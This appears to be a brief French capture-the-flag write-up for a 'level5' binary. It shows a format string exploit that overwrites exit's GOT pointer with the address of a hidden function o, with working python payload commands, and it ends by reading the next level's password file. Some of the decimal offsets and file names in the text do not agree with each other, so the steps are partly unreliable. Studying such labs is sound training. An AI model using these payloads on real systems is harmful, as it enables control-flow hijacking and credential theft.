On a un programme avec O et N

dans la fonction N on a un call de printf et de exit, la fonction O call uniquement exit avec un fgets (protege par les attacks buffer overflow)
on recupere l'adresse de O avec info function o qui est : 0x080484a4

si on disas le exit on voit qu'il a un jump un pointer p *0x8049838 avec sa valeur decimal qui est egal a 134513622 

on cherche a modifier le pointeur du jump de l'exit vers la fonction O donc on va remplacer le pointer 0x8049838 par l'adresse de O 0x080484a4

python -c 'print "CCCC %x %x %x %x %x"' > /tmp/test5
cat /tmp/test | ./level5

on cherche la position de notre buffer
l'adresse de exit est a la 4 eme position

donc il faut push l'adresse de o qui est : 0x080484a4 traduit en decimal : 134513628 - 4 car l'adresse fait 4 bytes

python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/test52
cat /tmp/test52 - | ./level5

cat /home/user/level6/.pass
